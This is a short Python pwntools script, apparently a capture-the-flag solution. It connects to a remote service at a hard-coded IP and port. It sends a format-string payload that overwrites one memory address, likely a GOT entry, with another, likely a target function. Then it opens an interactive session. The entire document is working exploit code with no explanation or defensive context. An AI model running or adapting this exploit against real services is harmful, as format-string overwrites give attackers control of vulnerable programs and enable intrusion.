from pwn import *

context.log_level = 'debug'
r = remote('104.154.106.182', 5678)

p = fmtstr_payload(7, {0x80498fc: 0x0804853d}, numbwritten=0, write_size='byte')

r.recvuntil('\n')
r.sendline(p)
r.recvuntil('\n')
r.interactive()
